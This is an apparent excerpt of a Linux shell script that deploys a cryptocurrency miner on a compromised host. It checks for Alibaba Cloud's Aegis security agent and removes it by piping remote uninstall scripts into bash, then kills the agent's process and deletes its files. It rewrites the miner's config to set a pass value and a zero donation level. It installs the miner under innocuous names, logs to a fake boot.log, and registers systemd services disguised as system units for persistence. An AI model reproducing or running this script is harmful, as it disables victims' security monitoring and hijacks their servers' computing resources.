...
if ps aux | grep -i '[a]liyun'; then
  curl -s -L http://update.aegis.aliyun.com/download/uninstall.sh | bash
  curl -s -L http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
  curl -s -L http://update.aegis.aliyun.com/download/uninstall.sh | bash
  curl -s -L http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
  pkill -f aliyun-service 2>/dev/null
  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service 2>/dev/null
...
# install
apt-get install -y tar bash 2>/dev/null
apk add tar bash 2>/dev/null
pacman -S tar bash 2>/dev/null
...
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' /usr/bin/dof
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' /usr/bin/dof

# create start cpunp shell
cat >/usr/bin/fa <<EOL
#!/bin/sh
nohup nice /usr/bin/cpunp --config=/usr/bin/dof > /var/log/boot.log 2>&1 &
#nice /usr/bin/cpunp -c /usr/bin/dof -B
EOL
# create scheck cpunp shell
cat >/usr/bin/scheck <<EOL
#!/bin/sh
nohup /usr/bin/check > /var/log/boot.log 2>&1 &
EOL
# create check cpunp shell
cat >/usr/bin/check <<EOL
#!/bin/sh
sleep 30
...
EOL
# chmod
chmod +x /usr/bin/cpunp /usr/bin/fa /usr/bin/dof /usr/bin/check /usr/bin/scheck /usr/bin/crons
# create start cpunp service
cat >/lib/systemd/system/systemd-hostnames.service <<EOL
[Unit]
Description=cpunpservice
[Service]
Type=forking
ExecStart=/usr/bin/fa
Restart=always
PrivateTmp=true
Nice=10
CPUWeight=1
...
cat >/lib/systemd/system/systemd-check.service <<EOL
[Unit]
Description=check service
[Service]
Type=forking
ExecStart=/usr/bin/scheck
PrivateTmp=true
[Install]
WantedBy=multi-user.target
EOL

cat >/lib/systemd/system/systemd-hcrons.service <<EOL
[Unit]
Description=crontab service
[Service]
Type=forking
ExecStart=nohup /usr/bin/crons > /var/log/boot.log 2>&1 &
Restart=always
PrivateTmp=true
[Install]
WantedBy=multi-user.target
...
systemctl enable systemd-hcrons.service 2>/dev/null
systemctl enable systemd-hostnames.service 2>/dev/null
systemctl start systemd-hostnames.service 2>/dev/null
systemctl enable systemd-check 2>/dev/null
